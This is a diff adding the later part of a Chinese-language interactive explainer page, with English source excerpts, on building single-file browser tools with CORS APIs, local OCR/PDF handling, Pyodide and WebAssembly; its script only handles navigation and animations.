+  <div class="a3_arw_l a3_al3"></div>
+  <div class="a3_arw_l a3_al4"></div>
+
+  <!-- Browser -->
+  <div class="a3_browser">
+    <div class="a3_browser_bar">
+      <div class="a3_browser_dot"></div>
+      <div class="a3_browser_dot"></div>
+      <div class="a3_browser_dot"></div>
+    </div>
+    <div class="a3_pulse"></div>
+    <div class="a3_browser_label">浏览器处理</div>
+  </div>
+
+  <!-- File arrows -->
+  <div class="a3_arw_r a3_ar1"></div>
+  <div class="a3_arw_r a3_ar2"></div>
+  <div class="a3_arw_r a3_ar3"></div>
+
+  <!-- File tags -->
+  <div class="a3_file_col">
+    <div class="a3_file_tag a3_ft1">OCR</div>
+    <div class="a3_file_tag a3_ft2">PDF</div>
+    <div class="a3_file_tag a3_ft3">文件输入</div>
+  </div>
+
+  <!-- Down arrow -->
+  <div class="a3_arw_down"></div>
+
+  <!-- Results -->
+  <div class="a3_results">
+    <div class="a3_result_card a3_rc1">数据</div>
+    <div class="a3_result_card a3_rc2">识别</div>
+    <div class="a3_result_card a3_rc3">解析</div>
+  </div>
+
+  <div class="a3_badge">无需服务器上传</div>
+</div></div>
+      <div class="source-panel reveal reveal-delay-3">
+        <button class="source-toggle" onclick="toggleSource(this)"><span class="arrow">&#9654;</span> 原文对照</button>
+        <div class="source-body"><span class="source-label">Original</span>
+          <p>CORS-enabled APIs unlock significant possibilities. Useful sources include iNaturalist, PyPI, GitHub, Bluesky, and Mastodon. GitHub's public repository API particularly shines, offering cached access via raw.githubusercontent.com without rate-limit anxiety.</p>
+          <p>LLM APIs (OpenAI, Anthropic, Gemini) support direct CORS calls, though API key management requires localStorage implementation for security.</p>
+          <p>File handling via input type="file" enables browser-based processing without server uploads. The OCR tool demonstrates running Tesseract.js and PDF.js locally.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="feed-section" style="background:var(--bg-act2)">
+    <div class="section-inner">
+      <h2 class="big-statement reveal">Pyodide + WebAssembly：<br><span style="color:var(--accent2)">Python 在浏览器中跑</span></h2>
+      <p class="body-text reveal reveal-delay-1">HTML 工具的终极能力扩展来自 <span class="hl2">WebAssembly</span>。Pyodide 把完整的 Python 运行时编译成 WASM，让 Python 代码直接在浏览器中执行——甚至支持通过 micropip 安装 PyPI 包。这意味着你可以在一个单文件 HTML 工具中运行数据科学工作流，不需要任何服务器端 Python 环境。更广泛地说，WebAssembly 把大量现有软件移植到了浏览器：Tesseract OCR 可以做文字识别，SLOCCount 可以统计代码行数。Simon 指出，这种「<span class="hl">浏览器即平台</span>」的模式避免了 LLM 平台沙盒的限制（比如 Claude Artifacts 不能加载外部数据、ChatGPT Canvas 会显示安全警告），同时 GitHub Pages 提供了免费、可靠的静态托管。</p>
+      <div class="anim-stage reveal reveal-delay-2" id="a4-anim"><div class="a4_stage">
+  <div class="a4_title">WASM 架构</div>
+
+  <div class="a4_hosting">
+    <span class="a4_hosting_label">GitHub Pages</span>
+  </div>
+  <div class="a4_hosting_arrow"></div>
+  <span class="a4_free_tag">免费托管 &#8595;</span>
+
+  <div class="a4_layers">
+    <div class="a4_apps">
+      <div class="a4_app">Python<br>Pyodide</div>
+      <div class="a4_app">OCR</div>
+      <div class="a4_app">代码分析</div>
+    </div>
+    <div class="a4_layer a4_layer_wasm">WebAssembly</div>
+    <div class="a4_layer a4_layer_browser">浏览器</div>
+  </div>
+</div></div>
+      <div class="source-panel reveal reveal-delay-3">
+        <button class="source-toggle" onclick="toggleSource(this)"><span class="arrow">&#9654;</span> 原文对照</button>
+        <div class="source-body"><span class="source-label">Original</span>
+          <p>Pyodide brings Python execution directly to browsers via WebAssembly, supporting micropip for loading PyPI packages. This eliminates build steps while enabling data science workflows.</p>
+          <p>WebAssembly broadly expands possibilities — beyond Pyodide, tools can leverage ports of existing software like Tesseract OCR and SLOCCount.</p>
+          <p>The absence of build steps makes self-hosting trivial compared to React-based approaches, while avoiding LLM platform sandboxes that restrict external data loading and impose user warnings.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<script>
+var layerStack=['layer-overview'];
+var transitioning=false;
+var layerNames={'layer-overview':'概览','layer-patterns':'工具模式','layer-advanced':'高级能力'};
+var observers=new Map();
+function setupObserver(layerId){if(observers.has(layerId))return;var layer=document.getElementById(layerId);var reveals=layer.querySelectorAll('.reveal, [class*="_stage"]');var obs=new IntersectionObserver(function(entries){entries.forEach(function(e){if(e.isIntersecting)e.target.classList.add('visible');});},{threshold:0.15,root:layer});reveals.forEach(function(el){obs.observe(el);});observers.set(layerId,obs);}
+function resetReveals(layerId){var layer=document.getElementById(layerId);layer.querySelectorAll('.reveal').forEach(function(el){el.classList.remove('visible');});layer.querySelectorAll('[class*="_stage"]').forEach(function(el){el.classList.remove('visible');});}
+function activateReveals(layerId){resetReveals(layerId);if(observers.has(layerId)){observers.get(layerId).disconnect();observers.delete(layerId);}requestAnimationFrame(function(){setupObserver(layerId);});}
+function updateBreadcrumb(){var bc=document.getElementById('breadcrumb');bc.innerHTML='';layerStack.forEach(function(id,i){if(i>0){var sep=document.createElement('span');sep.className='sep';sep.textContent='>';bc.appendChild(sep);}var span=document.createElement('span');span.textContent=layerNames[id]||id;if(i===layerStack.length-1){span.className='current';}else{span.addEventListener('click',function(){goBackTo(i);});}bc.appendChild(span);});var backBtn=document.getElementById('backBtn');backBtn.style.display=layerStack.length>1?'flex':'none';bc.style.left=layerStack.length>1?'60px':'16px';var dots=document.getElementById('depthDots');var depth=layerStack.length-1;dots.querySelectorAll('.dot').forEach(function(d,i){d.classList.toggle('active',i===depth);});}
+function drillDown(targetId,btnEl){if(transitioning)return;transitioning=true;var currentId=layerStack[layerStack.length-1];var currentLayer=document.getElementById(currentId);var targetLayer=document.getElementById(targetId);targetLayer.scrollTop=0;resetReveals(targetId);targetLayer.style.visibility='visible';var duration=600;currentLayer.style.transition='transform '+duration+'ms ease-out, opacity '+duration+'ms ease-out';currentLayer.style.transformOrigin='center center';currentLayer.style.transform='scale(1.3)';currentLayer.style.opacity='0';targetLayer.classList.add('active');targetLayer.style.opacity='0';targetLayer.style.transform='scale(0.85)';targetLayer.style.transition='transform '+duration+'ms ease-out, opacity '+duration+'ms ease-out';requestAnimationFrame(function(){requestAnimationFrame(function(){targetLayer.style.opacity='1';targetLayer.style.transform='scale(1)';});});setTimeout(function(){currentLayer.classList.remove('active');currentLayer.style.transition='';currentLayer.style.transform='';currentLayer.style.opacity='';targetLayer.style.transition='';targetLayer.style.transform='';activateReveals(targetId);transitioning=false;},duration+50);layerStack.push(targetId);updateBreadcrumb();}
+function goBack(){if(layerStack.length<=1||transitioning)return;transitioning=true;var currentId=layerStack.pop();var parentId=layerStack[layerStack.length-1];var currentLayer=document.getElementById(currentId);var parentLayer=document.getElementById(parentId);var duration=600;currentLayer.style.transition='transform '+duration+'ms ease-out, opacity '+duration+'ms ease-out';currentLayer.style.transform='scale(0.85)';currentLayer.style.opacity='0';parentLayer.classList.add('active');parentLayer.style.transform='scale(1.3)';parentLayer.style.opacity='0';parentLayer.style.transition='transform '+duration+'ms ease-out, opacity '+duration+'ms ease-out';requestAnimationFrame(function(){requestAnimationFrame(function(){parentLayer.style.transform='scale(1)';parentLayer.style.opacity='1';});});setTimeout(function(){currentLayer.classList.remove('active');currentLayer.style.transition='';currentLayer.style.transform='';currentLayer.style.opacity='';currentLayer.style.visibility='';parentLayer.style.transition='';parentLayer.style.transform='';transitioning=false;},duration+50);updateBreadcrumb();}
+function goBackTo(targetIndex){if(transitioning)return;while(layerStack.length-1>targetIndex){if(layerStack.length<=1)break;goBack();return;}}
+function toggleSource(btn){btn.classList.toggle('open');btn.nextElementSibling.classList.toggle('open');}
+setupObserver('layer-overview');
+updateBreadcrumb();
+</script>
+</body>
+</html>
